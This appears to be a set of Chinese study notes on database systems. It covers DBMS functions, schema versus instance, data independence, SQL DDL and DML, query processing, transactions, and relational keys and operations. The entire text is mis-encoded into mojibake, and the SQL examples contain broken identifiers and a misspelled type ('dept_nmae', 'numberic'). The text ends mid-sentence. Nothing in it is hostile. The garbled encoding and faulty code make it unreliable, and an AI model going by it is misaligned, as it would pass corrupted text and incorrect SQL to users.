æ•°æ®åº“çš„å»ºç«‹å’Œç»´æŠ¤åŠŸèƒ½ï¼šæ•°æ®åº“æ•°æ®æ‰¹é‡è£…è½½ï¼Œæ•°æ®åº“è½¬å‚¨ï¼Œä»‹è´¨æ•…éšœæ¢å¤ï¼Œæ•°æ®åº“çš„é‡ç»„ç»‡ï¼Œæ€§èƒ½ç›‘è§†  æ•°æ®åº“ç³»ç»Ÿ æ•°æ®åº“ç³»ç»Ÿï¼ˆDatabase Systemï¼Œç®€ç§°DBSï¼‰æ˜¯æŒ‡åœ¨è®¡ç®—æœºç³»ç»Ÿä¸­å¼•å…¥æ•°æ®åº“åçš„ç³»ç»Ÿï¼Œåœ¨ä¸å¼•èµ·æ··æ·†çš„æƒ…å†µä¸‹å¸¸å¸¸æŠŠæ•°æ®åº“ç³»ç»Ÿç®€ç§°ä¸ºæ•°æ®åº“\næ•°æ®åº“ç³»ç»Ÿçš„ç»„æˆï¼šç”±æ•°æ®åº“ã€æ•°æ®åº“ç®¡ç†ç³»ç»Ÿã€åº”ç”¨ç³»ç»Ÿï¼ˆåŠå…¶å¼€å‘å·¥å…·ï¼‰ã€æ•°æ®åº“ç®¡ç†å‘˜ï¼ˆå’Œç”¨æˆ·ï¼‰æ„æˆ\nå¦‚ä¸‹å›¾æ‰€ç¤º\nä¸‹å›¾ä¸ºå„ç³»ç»Ÿé—´çš„å…³ç³»\næ•°æ®ç®¡ç†æŠ€æœ¯ æ•°æ®ç®¡ç†ï¼šå¯¹æ•°æ®è¿›è¡Œåˆ†ç±»ã€ç»„ç»‡ã€ç¼–ç ã€å­˜å‚¨ã€æ£€ç´¢å’Œç»´æŠ¤ï¼Œæ˜¯æ•°æ®å¤„ç†çš„ä¸­å¿ƒé—®é¢˜\næ•°æ®ç®¡ç†çš„å‘å±•åŠ¨åŠ›ï¼šåº”ç”¨éœ€æ±‚çš„æ¨åŠ¨ï¼›è®¡ç®—æœºç¡¬ä»¶çš„å‘å±•ï¼›è®¡ç®—æœºè½¯ä»¶çš„å‘å±•ã€‚\nå‘å±•é˜¶æ®µï¼šâ‘ äººå·¥ç®¡ç†é˜¶æ®µï¼ˆ50å¹´ä»£ä¸­æœŸä»¥å‰ï¼‰â‘¡æ–‡ä»¶ç³»ç»Ÿé˜¶æ®µï¼ˆ50å¹´ä»£åæœŸ~60å¹´ä»£ä¸­æœŸï¼‰â‘¢æ•°æ®åº“ç³»ç»Ÿé˜¶æ®µï¼ˆ60å¹´ä»£åæœŸå¼€å§‹ï¼‰\n æ—©æœŸï¼Œæ•°æ®åº“åº”ç”¨ç¨‹åºç›´æ¥å»ºç«‹åœ¨æ–‡ä»¶ç³»ç»Ÿä¹‹ä¸Šï¼Œæ–‡ä»¶ç³»ç»Ÿçš„å¼Šç«¯å¦‚ä¸‹ï¼š\n æ•°æ®çš„å†—ä½™å’Œä¸ä¸€è‡´æ€§ï¼šå¤šç§æ–‡ä»¶æ ¼å¼ï¼Œç›¸åŒçš„ä¿¡æ¯åœ¨å‡ ä¸ªæ–‡ä»¶é‡å¤å­˜å‚¨ æ•°æ®è®¿é—®å›°éš¾ï¼šå¯¹äºæ¯ä¸€ä¸ªæ–°ä»»åŠ¡ï¼Œéœ€è¦å†™ä¸€ä¸ªç¨‹åº æ•°æ®å­¤ç«‹ï¼šæ•°æ®åˆ†æ•£åœ¨ä¸åŒæ ¼å¼çš„å¤šä¸ªæ–‡ä»¶ä¸­ å®Œæ•´æ€§é—®é¢˜ï¼šä¸€è‡´æ€§çº¦æŸâ€œæ·¹æ²¡â€åœ¨ç¨‹åºä»£ç ä¸­ï¼Œå¢åŠ æ–°çº¦æŸæˆ–ä¿®æ”¹ç°æœ‰çº¦æŸå¾ˆå›°éš¾ æ›´æ–°çš„åŸå­æ€§é—®é¢˜ï¼šéš¾ä»¥ä¿æŒåŸå­æ€§ï¼Œæ‰§è¡Œéƒ¨åˆ†æ›´æ–°ï¼Œæ˜¯çš„æ•°æ®å¤„äºä¸ä¸€è‡´çŠ¶æ€ å¤šç”¨æˆ·çš„å¹¶å‘è®¿é—®å¼‚å¸¸ï¼šç³»ç»Ÿçš„æ€»ä½“æ€§èƒ½å’Œç›¸åº”é€Ÿåº¦è¦æ±‚ï¼šå¹¶å‘è®¿é—®æ•°æ®ï¼Œæ²¡æœ‰æ§åˆ¶çš„å¹¶å‘è®¿é—®å¯¼è‡´ä¸ä¸€è‡´æ€§ å®‰å…¨æ€§é—®é¢˜ï¼šæ§åˆ¶ç”¨æˆ·åªå­˜å–éƒ¨åˆ†æ•°æ®éš¾ä»¥å®ç°   æ•°æ®åº“çš„è§‚ç‚¹ï¼šæ•°æ®ä¸æ˜¯ä¾èµ–äºå¤„ç†è¿‡ç¨‹çš„é™„å±å“ï¼Œè€Œæ˜¯ç°å®ä¸–ç•Œä¸­ç‹¬ç«‹å­˜åœ¨çš„å¯¹è±¡\næ•°æ®ç»Ÿä¸€æŒ‰è¡¨ç»“æ„å­˜æ”¾\næ•°æ®åº“VSæ–‡ä»¶ç³»ç»Ÿ ![](3.jpg) å®ä¾‹ä¸æ¨¡å¼ Instance and Schemas\nå‹(Schema)ä¸å€¼(Instance)çš„åŒºåˆ«ï¼š\n å‹æ˜¯å¯¹æ•°æ®çš„ç»“æ„å’Œå±æ€§çš„è¯´æ˜â€”â€”æ¨¡å¼ å€¼æ˜¯å‹çš„ä¸€ä¸ªå…·ä½“èµ‹å€¼â€”â€”å®ä¾‹ å‹æ˜¯ç›¸å¯¹ç¨³å®šçš„ï¼Œå€¼æ˜¯éšæ—¶é—´ä¸æ–­å˜åŒ–çš„  1 2 3 4 5 6  class person{ public:\tstring name; string address; }; person Tom; //personæ˜¯å‹,Tomæ˜¯å˜é‡,Tomåœ¨æŸæ—¶åˆ»çš„å€¼æ˜¯å®ä¾‹   æ¨¡å¼ï¼šæ•°æ®åº“çš„æ€»ä½“è®¾è®¡  é€šè¿‡é«˜çº§ç¨‹åºè®¾è®¡è¯­è¨€è¿›è¡Œç±»æ¯” ç‰©ç†æ¨¡å¼ï¼šåœ¨ç‰©ç†å±‚æè¿°çš„æ•°æ®åº“è®¾è®¡ é€»è¾‘æ¨¡å¼ï¼ˆå­æ¨¡å¼ï¼‰ï¼šåœ¨é€»è¾‘å±‚æè¿°çš„æ•°æ®åº“è®¾è®¡  å®ä¾‹ï¼šåœ¨ç‰¹å®šæ—¶åˆ»å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„ä¿¡æ¯é›†åˆ  ç±»ä¼¼äºä¸€ä¸ªå˜é‡çš„å€¼  ç‰©ç†æ•°æ®çš„ç‹¬ç«‹æ€§ï¼šç‰©ç†æ¨¡å¼çš„æ”¹å˜è€Œä¸ä¼šå½±å“é€»è¾‘æ¨¡å¼  åº”ç”¨ä¾èµ–äºé€»è¾‘æ¨¡å¼ åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåº”æ˜ç¡®å®šä¹‰ä¸åŒå±‚æ¬¡ä¹‹é—´å’Œç»„ä»¶ä¹‹é—´çš„æ¥å£ï¼Œè¿™æ ·æŸäº›éƒ¨åˆ†çš„æ”¹å˜ä¸ä¼šå¯¹å…¶ä»–éƒ¨åˆ†é€ æˆè¾ƒå¤§å½±å“  é€»è¾‘æ•°æ®çš„ç‹¬ç«‹æ€§  å½“æ¨¡å¼æ”¹å˜æ—¶ï¼Œä¿®æ”¹å¤–æ¨¡å¼ï¼ˆæ¨¡å¼æ˜ åƒï¼‰ï¼Œä½¿å¤–æ¨¡å¼ä¿æŒä¸å˜ï¼Œä»è€Œåº”ç”¨ç¨‹åºå¯ä»¥ä¿æŒä¸å˜ï¼Œç§°ä¸ºæ•°æ®çš„é€»è¾‘ç‹¬ç«‹æ€§  æ•°æ®è§†å›¾ ç‰©ç†å±‚ï¼šæè¿°æ•°æ®å­˜å‚¨\né€»è¾‘å±‚ï¼šæè¿°å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œä»¥åŠæ•°æ®é—´çš„å…³ç³»\nè§†å›¾å±‚ï¼šæœ€é«˜å±‚æ¬¡çš„æŠ½è±¡ï¼Œåªæè¿°æ•´ä¸ªæ•°æ®åº“çš„æŸéƒ¨åˆ†æ•°æ®ã€‚è§†å›¾å±‚æä¾›äº†é˜²æ­¢ç”¨æˆ·è®¿é—®æ•°æ®åº“çš„æŸäº›éƒ¨åˆ†çš„å®‰å…¨æ€§æœºåˆ¶\nå¦‚å›¾ï¼Œä¸‹å›¾çš„COBOLå’ŒPL/Iæ˜¯ç”±ç”±é€»è¾‘å±‚åˆ›å»ºçš„ä¸¤ä¸ªè§†å›¾ï¼Œè€Œæœ€ä¸‹é¢é‚£ä¸ªå³æ˜¯ç‰©ç†å±‚æ‰€å­˜æ”¾çš„æ•°æ®\næ•°æ®æ¨¡å‹ æ•°æ®åº“ç»“æ„çš„åŸºç¡€æ˜¯æ•°æ®æ¨¡å‹\næ•°æ®æ¨¡å‹æè¿°çš„å†…å®¹ï¼šæ•°æ®ã€æ•°æ®å…³ç³»ã€æ•°æ®è¯­ä¹‰ã€æ•°æ®çº¦æŸ\nå¸¸ç”¨æ•°æ®æ¨¡å‹ï¼šå…³ç³»æ¨¡å‹ã€å®ä½“-è”ç³»æ•°æ®æ¨¡å‹ï¼ˆERæ¨¡å‹ï¼Œä¸»è¦ç”¨äºæ•°æ®åº“è®¾è®¡ï¼‰ã€åŸºäºå¯¹è±¡çš„æ•°æ®æ¨¡å‹ï¼ˆooæ•°æ®æ¨¡å‹ï¼Œé¢å‘å¯¹è±¡å’Œå¯¹è±¡å…³ç³»ï¼‰ã€åŠç»“æ„åŒ–æ•°æ®æ¨¡å‹ï¼ˆXMLï¼Œå¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼‰ã€å…¶ä»–æ¨¡å‹ï¼ˆå¦‚ç½‘çŠ¶æ¨¡å‹ã€å±‚æ¬¡æ¨¡å‹ï¼‰ç­‰\næ•°æ®åº“è¯­è¨€  DMLï¼ˆData Manipulaton Languageï¼‰ï¼šæ“çºµæŒ‰ç…§æŸç§é€‚å½“çš„æ•°æ®æ¨¡å‹ç»„ç»‡èµ·æ¥çš„æ•°æ®çš„è¯­è¨€  æŸ¥è¯¢ æ›´æ–°ï¼ˆå¢ã€åˆ ã€æ”¹ï¼‰    DMLåˆ†ç±»ï¼šâ‘ è¿‡ç¨‹åŒ–ï¼šç”¨æˆ·æŒ‡å®šéœ€è¦ä»€ä¹ˆæ•°æ®ä»¥åŠå¦‚ä½•è·å¾—è¿™äº›æ•°æ®ï¼›â‘¡å£°æ˜å¼ï¼ˆéè¿‡ç¨‹åŒ–ï¼‰ï¼šç”¨æˆ·æŒ‡å®šéœ€è¦ä»€ä¹ˆæ•°æ®ï¼Œè€Œä¸æŒ‡æ˜å¦‚ä½•è·å¾—è¿™äº›æ•°æ®\nSQLæ˜¯åº”ç”¨æœ€å¹¿æ³›çš„DML\n DDLï¼ˆData Definition Languageï¼‰ï¼šç”¨äºå®šä¹‰æ•°æ®åº“æ¨¡å¼ä»¥åŠå…¶ä»–ç‰¹å¾çš„è¯­è¨€  æ•°æ®åº“æ¨¡å¼ å®Œæ•´æ€§çº¦æŸï¼š  ä¸»é”®ï¼ˆIDï¼Œç”¨æ¥ç¡®å®šå”¯ä¸€çš„instructorï¼‰ å‚ç…§å®Œæ•´æ€§ï¼ˆSQLä¸­çš„å‚ç…§çº¦æŸï¼‰   æ–­è¨€ æˆæƒ    DDLç¼–è¯‘å™¨äº§ç”Ÿä¸€ç³»åˆ—å­˜å‚¨åœ¨æ•°æ®å­—å…¸ä¸­çš„è¡¨ï¼Œæ•°æ®å­—å…¸åŒ…å«å…ƒæ•°æ®ï¼ˆå…ƒæ•°æ®æ˜¯å…³äºæ•°æ®çš„æ•°æ®ï¼‰\nå…³ç³»æ•°æ®åº“ SQLï¼šæ˜¯ä¸€é—¨å¹¿æ³›ä½¿ç”¨çš„éè¿‡ç¨‹åŒ–è¯­è¨€\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  # ä¾‹ # SQL-DML select instructor.ID, department.building from instructor, department where instructor.dept_name = department.dept_name and department.dept_nmae = 'Physics'; # SQL-DDL create table deptment( dept_name char(20), building char(20), budget numberic(12,2) );   æ¥è‡ªåº”ç”¨ç¨‹åºçš„æ•°æ®åº“è®¿é—®ï¼šDMLç”±å®¿ä¸»è¯­è¨€æ‰§è¡Œ\næ•°æ®åº“è®¾è®¡ æ•°æ®åº“è®¾è®¡çš„ä¸»è¦å†…å®¹æ˜¯æ•°æ®åº“æ¨¡å¼çš„è®¾è®¡\næ•°æ®åº“è®¾è®¡è¿‡ç¨‹ï¼š\n è·å–ç”¨æˆ·éœ€æ±‚ æ¦‚å¿µè®¾è®¡ é€»è¾‘è®¾è®¡ ç‰©ç†è®¾è®¡  ç°å®ä¸–ç•Œæ˜¯å®ä½“åŠå…¶å®ä½“ä¹‹é—´å…³ç³»çš„é›†åˆ\nå®ä½“ï¼šç°å®ä¸–ç•Œä¸­åŒºåˆ«äºå…¶ä»–å¯¹è±¡çš„äº‹æƒ…æˆ–ç‰©ä½“ï¼Œå®ä½“è¢«ä¸€ç»„å±æ€§æ‰€æè¿°\nå…³ç³»ï¼šå‡ ä¸ªå®ä½“ä¹‹é—´çš„å…³è”\nå¯ä»¥ç”¨å®ä½“å…³ç³»å›¾ï¼ˆentity-relationship diagramï¼ŒE-Rå›¾ï¼‰æ¥è¡¨ç¤º\nè§„èŒƒåŒ–ï¼šæ•°æ®åº“è®¾è®¡çš„å¦å¤–ä¸€ç§æ–¹æ³•ï¼Œç›®æ ‡æ˜¯ç”Ÿæˆä¸€ä¸ªå…³ç³»æ¨¡å¼é›†åˆï¼Œæ˜¯æˆ‘ä»¬çš„å­˜å‚¨ä¿¡æ¯æ˜¯æ²¡æœ‰ä¸å¿…è¦çš„å†—ä½™ï¼ŒåŒæ—¶åˆèƒ½æ–¹ä¾¿åœ°æ£€ç´¢æ•°æ®\nè§„èŒƒåŒ–æœ€å¸¸ç”¨çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨å‡½æ•°ä¾èµ–\nè§„èŒƒåŒ–ä¹Ÿæä¾›äº†åˆ¤å®šä¸€ä¸ªå…³ç³»æ¨¡å¼ä¼˜åŠ£çš„æ ‡å‡†\næ•°æ®å­˜å‚¨å’ŒæŸ¥è¯¢ å­˜å‚¨ç®¡ç†å™¨æ˜¯ä¸€ä¸ªç¨‹åºæ¨¡å—ï¼Œæä¾›äº†æ•°æ®åº“ä¸­å­˜å‚¨çš„ä½å±‚æ•°æ®ä¸åº”ç”¨ç¨‹åºä»¥åŠå‘ç³»ç»Ÿæäº¤çš„æŸ¥è¯¢ä¹‹é—´çš„æ¥å£\n å­˜å‚¨ç®¡ç†å™¨çš„ä»»åŠ¡  ä¸æ–‡ä»¶ç®¡ç†å™¨äº¤äº’ å¯¹æ•°æ®çš„æœ‰æ•ˆçš„å­˜å‚¨ã€æŸ¥è¯¢ã€æ›´æ–°   å­˜å‚¨ç®¡ç†å™¨éƒ¨ä»¶  æƒé™åŠå®Œæ•´æ€§ç®¡ç†å™¨ äº‹åŠ¡ç®¡ç†å™¨ æ–‡ä»¶ç®¡ç†å™¨ ç¼“å†²åŒºç®¡ç†å™¨    æŸ¥è¯¢ç®¡ç†å™¨ æŸ¥è¯¢ç®¡ç†å™¨çš„ç»„ä»¶åŒ…æ‹¬\n DDLè§£é‡Šå™¨ï¼šä»–è§£é‡ŠDDLè¯­å¥ï¼Œå¹¶å°†è¿™äº›å®šä¹‰è®°å½•åœ¨æ•°æ®å­—å…¸ä¸­ DMLç¼–è¯‘å™¨ï¼šå°†æŸ¥è¯¢è¯­è¨€ä¸­çš„DMLè¯­å¥ç¿»è¯‘æˆä¸ºä¸€ä¸ªæ‰§è¡Œæ–¹æ¡ˆ æŸ¥è¯¢æ‰§è¡Œå¼•æ“ï¼šæ‰§è¡Œç”±DMLç¼–è¯‘å™¨äº§ç”Ÿçš„ä½çº§æŒ‡ä»¤   æŸ¥è¯¢å¤„ç†å™¨çš„å·¥ä½œè¿‡ç¨‹  è§£æå’Œè½¬æ¢ ä¼˜åŒ– è®¡ç®—    è¿‡ç¨‹å¦‚ä¸‹å›¾\nä¸¤æ–¹é¢æ¥è¯„ä¼°ä¸€ä¸ªç»™å®šæŸ¥è¯¢ï¼šâ‘ æ­£åˆ™è¡¨è¾¾å¼â‘¡æ¯ä¸ªæ“ä½œæœ‰ä¸åŒçš„å®ç°ç®—æ³•\néœ€è¦ä¼°è®¡æ“ä½œçš„å¼€é”€ï¼šå…³é”®å–å†³äºæ•°æ®åº“éœ€è¦ç»´æŠ¤çš„å…³ç³»çš„ç»Ÿè®¡ä¿¡æ¯ï¼›éœ€è¦é¡¾åŠä¸­é—´ç»“æœçš„ç»Ÿè®¡æ•°æ®ï¼Œä»è€Œè®¡ç®—å¤æ‚çš„è¡¨è¾¾å¼æˆæœ¬\näº‹åŠ¡ç®¡ç† äº‹åŠ¡æ˜¯ç”±ä¸€ç³»åˆ—æ“ä½œåºåˆ—æ„æˆçš„ç¨‹åºæ‰§è¡Œå•å…ƒï¼Œæ˜¯ä¸€ä¸ªä¸å¯åˆ†å‰²çš„å·¥ä½œå•ä½\näº‹åŠ¡ç®¡ç†ç»„ä»¶ä¿è¯äº†å½“ç³»ç»Ÿå‡ºç°äº†æ•…éšœï¼ˆä¾‹å¦‚ç”µæºæ•…éšœã€æ“ä½œç³»ç»Ÿå´©æºƒï¼‰æˆ–äº‹åŠ¡å¤±è´¥æ—¶ï¼Œæ•°æ®åº“ä»ç„¶ä¿æŒä¸€è‡´æ€§ï¼ˆæ­£ç¡®æ€§ï¼‰\nå¹¶å‘æ§åˆ¶ç®¡ç†å™¨æ§åˆ¶äº†å¹¶å‘äº‹åŠ¡é—´çš„ç›¸äº’å½±å“ï¼Œä¿è¯æ•°æ®åº“çš„ä¸€è‡´æ€§\næ•°æ®åº“ç³»ç»Ÿå†…éƒ¨ç»“æ„ æ•°æ®åº“ä½“ç³»ç»“æ„ æ•°æ®åº“ç³»ç»Ÿçš„ä½“ç³»ç»“æ„å¾ˆå¤§ç¨‹åº¦ä¸Šå–å†³äºæ•°æ®åº“ç³»ç»Ÿæ‰€è¿è¡Œçš„è®¡ç®—æœºç³»ç»Ÿ\n é›†ä¸­å¼ å®¢æˆ·/æœåŠ¡å™¨å¼  è¿œç¨‹æ•°æ®åº“ç”¨æˆ·å·¥ä½œç”¨çš„å®¢æˆ·æœºï¼ˆClinetï¼‰ è¿è¡Œæ•°æ®åº“ç³»ç»Ÿçš„æœåŠ¡å™¨ï¼ˆServerï¼‰   å¹¶è¡Œï¼ˆå¤šå¤„ç†å™¨ï¼‰  å¹¶è¡Œç³»ç»Ÿé€šè¿‡å¹¶è¡Œåœ°ä½¿ç”¨å¤šä¸ªå¤„ç†å™¨å’Œç£ç›˜æ¥æé«˜å¤„ç†é€Ÿåº¦å’ŒI/Oé€Ÿåº¦   åˆ†å¸ƒå¼  åœ¨åˆ†å¸ƒå¼æ•°æ®åº“ç³»ç»Ÿä¸­ï¼Œæ•°æ®åº“å­˜å‚¨äºå‡ å°è®¡ç®—æœºä¸­ï¼Œåˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„è®¡ç®—æœºä¹‹é—´é€šè¿‡ç½‘ç»œç›¸äº’é€šä¿¡ï¼Œä»–ä»¬ä¸å…±äº«ä¸»å­˜å‚¨å™¨æˆ–ç£ç›˜    æ•°æ®æŒ–æ˜ æ•°æ®æŒ–æ˜å¼åº”ç”¨ä¸€ç³»åˆ—æŠ€æœ¯ä»å¤§å‹æ•°æ®åº“æˆ–æ•°æ®ä»“åº“ä¸­æå–äººä»¬æ„Ÿå…´è¶£çš„ä¿¡æ¯å’ŒçŸ¥è¯†ï¼Œè¿™äº›çŸ¥è¯†æˆ–ä¿¡æ¯å¼éšå«çš„ï¼Œå®ç°æœªçŸ¥è€Œæ½œåœ¨æœ‰ç”¨çš„ï¼Œæå–çš„çŸ¥è¯†è¡¨ç¤ºä¸ºæ¦‚å¿µã€è§„åˆ™ã€è§„å¾‹ã€æ¨¡å¼ç­‰å½¢å¼\næ•°æ®æŒ–æ˜å¼ä¸€ç±»æ·±å±‚æ¬¡çš„æ•°æ®åˆ†æ\næ•°æ®åº“ç®¡ç†å‘˜ å¯¹æ•°æ®åº“ç³»ç»Ÿè¿›è¡Œé›†ä¸­æ§åˆ¶çš„äººç§°ä½œæ•°æ®åº“ç®¡ç†å‘˜ï¼ˆDatabase Administratorï¼‰\n DBAçš„ä½œç”¨  æ¨¡å¼å®šä¹‰ å­˜å‚¨ç»“æ„åŠå­˜å–æ–¹æ³•å®šä¹‰ æ¨¡å¼åŠç‰©ç†ç»„ç»‡çš„ä¿®æ”¹ æ•°æ®è®¿é—®æˆæƒ æ—¥å¸¸ç»´æŠ¤    å…³ç³»æ¨¡å‹ å…³ç³»ç†è®ºæ˜¯å»ºç«‹åœ¨é›†åˆä»£æ•°ç†è®ºåŸºç¡€ä¸Šçš„ï¼Œæœ‰åšå®çš„æ•°å­¦åŸºç¡€\nå…³ç³»æ•°æ®ç»“æ„   å•ä¸€çš„æ•°æ®ç»“æ„â€”â€”å…³ç³»ï¼šç°å®ä¸–ç•Œä¸­çš„å®ä½“åŠå®ä½“é—´çš„å„ç§è”ç³»å‡ç”¨å…³ç³»æ¥è¡¨ç¤º\n  æ•°æ®çš„é€»è¾‘ç»“æ„â€”â€”äºŒç»´è¡¨ï¼šä»ç”¨æˆ·è§’åº¦ï¼Œå…³ç³»æ¨¡å‹ä¸­çš„æ•°æ®çš„é€»è¾‘ç»“æ„æ˜¯ä¸€å¼ äºŒç»´è¡¨\n  å±æ€§çš„ç±»å‹   æ¯ä¸ªå±æ€§çš„å¯èƒ½çš„å–å€¼èŒƒå›´ï¼ˆé›†åˆï¼‰å«å±æ€§çš„åŸŸ\n  å±æ€§çš„å€¼ï¼ˆé€šå¸¸ï¼‰è¦æ±‚ä¸ºåŸå­çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸å¯å†åˆ†çš„\n å±æ€§çš„åŸå­æ€§é—®é¢˜è¦æ ¹æ®åº”ç”¨çš„éœ€æ±‚ç¡®å®š    nullï¼ˆç©ºå€¼ï¼‰ï¼šæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å€¼ï¼Œè¡¨ç¤ºå€¼æœªçŸ¥æˆ–ä¸å­˜åœ¨\n ç©ºå€¼ç»™æ•°æ®åº“è®¿é—®å’Œæ›´æ–°å¸¦æ¥äº†å¾ˆå¤šå›°éš¾    å…³ç³»çš„åŸºæœ¬æ¦‚å¿µ å…³ç³» ç¬›å¡å°”ç§¯D1 Ã— D2 Ã— ... Ã— Dn çš„å­é›†å«åšåœ¨åŸŸD1ï¼ŒD2 ï¼Œ...ï¼ŒDn ä¸Šçš„å…³ç³»ï¼Œç”¨R(D1ï¼ŒD2 ï¼Œ...ï¼ŒDn )è¡¨ç¤º\nRæ˜¯å…³ç³»çš„åå­—ï¼Œnæ˜¯å…³ç³»çš„åº¦æˆ–ç›®\nå…³ç³»æ˜¯ç¬›å¡å°”ç§¯ä¸­æœ‰æ„ä¹‰çš„å­é›†\nå…³ç³»ä¹Ÿå¯ä»¥è¡¨ç¤ºä¸ºäºŒç»´è¡¨\nå…³ç³»æ¨¡å‹å’Œå®ä¾‹ A1,A2,...,An æ˜¯å±æ€§ R = (A1,A2,...,An) æ˜¯ä¸€ä¸ªå…³ç³»æ¨¡å¼ ä¾‹: instructor = (ID,name,dept_name,salary) å½¢å¼ä¸Šï¼Œç»™å®šé›†åˆD1,D2,...,Dn,ä¸€ä¸ªå…³ç³»ræ˜¯D1Ã—D2Ã—...Ã—Dn çš„ä¸€ä¸ªå­é›†,å› æ­¤,ä¸€ä¸ªå…³ç³»æ˜¯ä¸€ç»„nå…ƒç»„(a1,a2,...,an)çš„é›†åˆï¼Œå…¶ä¸­ai âˆˆ Di å…³ç³»çš„å½“å‰å€¼ï¼ˆå…³ç³»å®ä¾‹ï¼‰å¯ä»¥ç”¨ä¸€ä¸ªè¡¨æŒ‡å®š\nå…ƒç´ tæ˜¯å…³ç³»rä¸­çš„ä¸€ä¸ªå…ƒç»„ï¼Œè¡¨ä¸­ä¸€è¡Œä»£è¡¨ä¸€ä¸ªå…ƒç»„\n æ•°æ®åº“ç”±å¤šä¸ªå…³ç³»ç»„æˆ  ç    ç çš„ä½œç”¨ï¼šæˆ‘ä»¬å¿…é¡»æœ‰ä¸€ç§èƒ½å¤ŸåŒºåˆ†ç»™å®šå…³ç³»ä¸­ä¸åŒå…ƒç»„çš„æ–¹æ³•ã€‚æˆ‘ä»¬ä¸€èˆ¬ç”¨å…ƒç»„ä¸­çš„å±æ€§è¡¨æ˜ï¼Œå³ä¸€ä¸ªå…ƒç»„çš„å±æ€§å€¼å¿…é¡»æ˜¯èƒ½å¤Ÿå”¯ä¸€åŒºåˆ†å…ƒç»„çš„ï¼Œä¸€ä¸ªå…³ç³»ä¸­æ²¡æœ‰ä¸¤ä¸ªå…ƒç»„åœ¨æ‰€æœ‰å±æ€§ä¸Šçš„å–å€¼éƒ½ç›¸åŒ\n  è¶…ç ï¼šè¶…ç æ˜¯ä¸€ä¸ªæˆ–è€…å¤šä¸ªå±æ€§çš„é›†åˆï¼Œè¿™äº›å±æ€§çš„ç»„åˆå¯ä»¥ä½¿æˆ‘ä»¬åœ¨ä¸€ä¸ªå…³ç³»ä¸­å”¯ä¸€åœ°æ ‡è¯†ä¸€ä¸ªå…ƒç»„ï¼ˆä¾‹å¦‚ï¼Œ{ID}å’Œ{IDï¼Œname}éƒ½æ˜¯instructorçš„è¶…ç ï¼‰\n  å€™é€‰ç ï¼šæœ€å°çš„è¶…ç ç§°ä¸ºå€™é€‰ç ï¼Œå³è¶…ç çš„ä»»æ„çœŸå­é›†éƒ½ä¸èƒ½æˆä¸ºè¶…ç ï¼ˆä¾‹å¦‚ï¼Œ{ID}æ˜¯Instructorçš„ä¸€ä¸ªå€™é€‰ç ï¼‰\n  ä¸»ç ï¼šä»ä¸€ä¸ªå…³ç³»çš„å¤šä¸ªå€™é€‰ç ä¸­é€‰å®šä¸€ä¸ªä½œä¸ºä¸»ç ï¼ˆä¹ æƒ¯ä¸ŠæŠŠä¸»ç å±æ€§æ”¾åœ¨å…¶ä»–å±æ€§å‰é¢ï¼Œå¹¶ä¸”åŠ ä¸‹åˆ’çº¿ï¼‰\n  å¤–ç ï¼šä¸€ä¸ªå…³ç³»æ¨¡å¼r1å¯èƒ½åœ¨ä»–çš„å±æ€§ä¸­åŒ…å«å¦ä¸€ä¸ªå…³ç³»r2çš„ä¸»ç ï¼Œè¿™ä¸ªå±æ€§ç§°ä½œr1ä¸Šå‚ç…§r2çš„å¤–ç ï¼ˆr1å’Œr2å¯ä»¥æ˜¯åŒä¸€ä¸ªå…³ç³»ï¼‰\n å…³ç³»r1ç§°ä½œå¤–ç ä¾èµ–çš„å‚ç…§å…³ç³» å…³ç³»r2ç§°ä½œå¤–ç çš„è¢«å‚ç…§å…³ç³»    å…³ç³»æŸ¥è¯¢è¯­è¨€ æŸ¥è¯¢è¯­è¨€æ˜¯ç”¨æˆ·ç”¨æ¥ä»æ•°æ®åº“ä¸­è¯·æ±‚è·å–ä¿¡æ¯çš„è¯­è¨€\n å¹¿æ³›åº”ç”¨çš„æŸ¥è¯¢è¯­è¨€ï¼šSQL â€œçº¯â€æŸ¥è¯¢è¯­è¨€  å…³ç³»ä»£æ•°ï¼ˆè¿‡ç¨‹åŒ–ï¼‰ å…ƒç»„å…³ç³»æ¼”ç®—ï¼ˆéè¿‡ç¨‹åŒ–ï¼‰ åŸŸå…³ç³»æ¼”ç®—ï¼ˆéè¿‡ç¨‹åŒ–ï¼‰    å…³ç³»æ“ä½œ  åŸºæœ¬æ“ä½œ  ä¸€å…ƒè¿ç®—  é€‰æ‹©ã€æŠ•å½±ã€æ›´å   å¤šå…ƒè¿ç®—  ç¬›å¡å°”ç§¯ã€å¹¶ã€é›†åˆå·®     å…¶ä»–è¿ç®—  é›†åˆäº¤ã€Î¸è¿æ¥ï¼Œè‡ªç„¶è¿æ¥ã€é™¤ã€èµ‹å€¼    è‡ªç„¶è¿æ¥ï¼šè®¾rå’Œsæ˜¯å…³ç³»æ¨¡å¼Rå’ŒSçš„å®ä¾‹ï¼ŒRå’ŒSå…³ç³»å®ä¾‹çš„è‡ªç„¶è¿æ¥æ˜¯å…³ç³»æ¨¡å¼RâˆªSçš„å®ä¾‹ï¼Œéµå®ˆä»¥ä¸‹è§„åˆ™ï¼šâ‘ å¯¹äºæ¯ä¸€å¯¹å…ƒç»„ tr å’Œ ts ï¼Œå…¶ä¸­ tr æ¥è‡ªrï¼Œts æ¥è‡ªsï¼›â‘¡å¦‚æœ tr å’Œ ts åœ¨å±æ€§ç»„Râˆ©Sä¸Šçš„æ¯ä¸ªå±æ€§å€¼éƒ½ä¸€æ ·ï¼Œæ·»åŠ ä¸€ä¸ªå…ƒç»„tåˆ°ç»“æœé›†ï¼Œå…¶ä¸­ tç”±tr åœ¨rä¸Šç›¸åŒçš„å€¼ï¼Œtæœ‰ ts åœ¨sä¸Šç›¸åŒçš„å€¼\nç¬›å¡å°”ç§¯è¿ç®—ä»ä¸¤ä¸ªå…³ç³»ä¸­åˆå¹¶å…ƒç»„ï¼Œä½†ä¸åŒäºè¿æ¥è¿ç®—çš„æ˜¯ï¼Œå…¶ç»“æœåŒ…å«æ¥è‡ªä¸¤ä¸ªå…³ç³»å…ƒç»„çš„æ‰€æœ‰å¯¹ï¼Œæ— 